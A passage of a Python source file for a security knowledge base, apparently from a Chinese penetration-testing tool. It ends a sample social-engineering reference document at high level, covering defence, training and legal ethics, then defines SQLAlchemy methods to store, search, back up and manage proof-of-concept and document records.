- **硬件后门**: 物理硬件后门植入
- **设备窃取**: 敏感设备物理窃取

## 5. 防御与检测

### 5.1 安全意识培训
- **识别训练**: 社会工程攻击识别训练
- **应急响应**: 社会工程事件应急响应
- **持续教育**: 持续的安全意识教育

### 5.2 技术防护措施
- **邮件过滤**: 高级邮件安全过滤
- **访问控制**: 严格的物理和逻辑访问控制
- **监控审计**: 全面的安全监控和审计

## 6. 法律与道德

### 6.1 法律合规性
- **授权范围**: 严格控制在授权范围内
- **隐私保护**: 个人信息保护合规性
- **证据保存**: 测试过程和结果证据保存

### 6.2 道德规范
- **最小影响**: 尽量减少对个人的影响
- **目的正当**: 测试目的必须正当合法
- **结果保密**: 测试结果严格保密

---

*本文档由昆仑安全实验室基于社会工程学实战经验编写*''',
                'doc_type': 'reference',
                'category': '社会工程学',
                'author': '昆仑安全实验室',
                'skill_level': 'advanced',
                'tags': ['社会工程学', '心理操控', '钓鱼', '物理安全', '防御']
            }
        ]
        
        for doc_data in sample_docs:
            doc = Document(**doc_data)
            self.session.add(doc)
        
        self.session.commit()
    
    def get_poc(self, poc_id: str) -> Optional[Dict[str, Any]]:
        """根据ID获取POC"""
        try:
            poc = self.session.query(POC).filter_by(poc_id=poc_id).first()
            return poc.to_dict() if poc else None
        except Exception as e:
            logger.error(f"获取POC失败: {e}")
            return None
    
    def get_all_pocs(self, filters: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """获取所有POC"""
        try:
            query = self.session.query(POC)
            
            if filters:
                if 'poc_type' in filters:
                    query = query.filter(POC.poc_type == filters['poc_type'])
                if 'risk_level' in filters:
                    query = query.filter(POC.risk_level == filters['risk_level'])
                if 'tags' in filters:
                    # 简单的标签过滤（实际应该使用更复杂的查询）
                    pass
            
            pocs = query.all()
            return [poc.to_dict() for poc in pocs]
            
        except Exception as e:
            logger.error(f"获取POC列表失败: {e}")
            return []
    
    def search_pocs(self, query: str, limit: int = 50) -> List[Dict[str, Any]]:
        """搜索POC"""
        try:
            results = self.session.query(POC).filter(
                POC.name.contains(query) | 
                POC.description.contains(query) |
                POC.content.contains(query)
            ).limit(limit).all()
            
            return [poc.to_dict() for poc in results]
            
        except Exception as e:
            logger.error(f"搜索POC失败: {e}")
            return []
    
    def add_poc(self, poc_data: Dict[str, Any]) -> bool:
        """添加POC"""
        try:
            poc = POC(**poc_data)
            self.session.add(poc)
            self.session.commit()
            logger.info(f"POC添加成功: {poc_data['poc_id']}")
            return True
            
        except Exception as e:
            logger.error(f"添加POC失败: {e}")
            self.session.rollback()
            return False
    
    def update_poc(self, poc_id: str, updates: Dict[str, Any]) -> bool:
        """更新POC"""
        try:
            poc = self.session.query(POC).filter_by(poc_id=poc_id).first()
            if not poc:
                return False
            
            for key, value in updates.items():
                if hasattr(poc, key):
                    setattr(poc, key, value)
            
            poc.updated_date = datetime.utcnow()
            self.session.commit()
            logger.info(f"POC更新成功: {poc_id}")
            return True
            
        except Exception as e:
            logger.error(f"更新POC失败: {e}")
            self.session.rollback()
            return False
    
    def delete_poc(self, poc_id: str) -> bool:
        """删除POC"""
        try:
            poc = self.session.query(POC).filter_by(poc_id=poc_id).first()
            if poc:
                self.session.delete(poc)
                self.session.commit()
                logger.info(f"POC删除成功: {poc_id}")
                return True
            return False
            
        except Exception as e:
            logger.error(f"删除POC失败: {e}")
            self.session.rollback()
            return False
    
    def get_document(self, doc_id: str) -> Optional[Dict[str, Any]]:
        """根据ID获取文档"""
        try:
            doc = self.session.query(Document).filter_by(doc_id=doc_id).first()
            return doc.to_dict() if doc else None
        except Exception as e:
            logger.error(f"获取文档失败: {e}")
            return None
    
    def search_documents(self, query: str, limit: int = 50) -> List[Dict[str, Any]]:
        """搜索文档"""
        try:
            results = self.session.query(Document).filter(
                Document.title.contains(query) | 
                Document.content.contains(query) |
                Document.tags.contains(f'"{query}"')
            ).limit(limit).all()
            
            return [doc.to_dict() for doc in results]
            
        except Exception as e:
            logger.error(f"搜索文档失败: {e}")
            return []
    
    def get_database_stats(self) -> Dict[str, int]:
        """获取数据库统计信息"""
        try:
            return {
                'pocs_count': self.session.query(POC).count(),
                'vulnerabilities_count': self.session.query(Vulnerability).count(),
                'documents_count': self.session.query(Document).count()
            }
        except Exception as e:
            logger.error(f"获取数据库统计失败: {e}")
            return {}
    
    def backup_database(self, backup_path: str) -> bool:
        """备份数据库"""
        try:
            import shutil
            shutil.copy2(self.db_path, backup_path)
            logger.info(f"数据库备份成功: {backup_path}")
            return True
        except Exception as e:
            logger.error(f"数据库备份失败: {e}")
            return False
    
    def optimize_database(self) -> bool:
        """优化数据库"""
        try:
            # 执行SQLite优化命令
            self.session.execute("VACUUM")
            self.session.execute("PRAGMA optimize")
            self.session.commit()
            logger.info("数据库优化完成")
            return True
        except Exception as e:
            logger.error(f"数据库优化失败: {e}")
            return False
    
    def close(self):
        """关闭数据库连接"""
        try:
            if self.session:
                self.session.close()
            if self.engine:
                self.engine.dispose()
            logger.info("数据库连接已关闭")
        except Exception as e:
            logger.error(f"关闭数据库连接失败: {e}")

# 数据库管理器单例
_database_instance = None

def get_database_manager() -> DatabaseManager:
    """获取数据库管理器实例"""
    global _database_instance
    if _database_instance is None:
        _database_instance = DatabaseManager()
    return _database_instance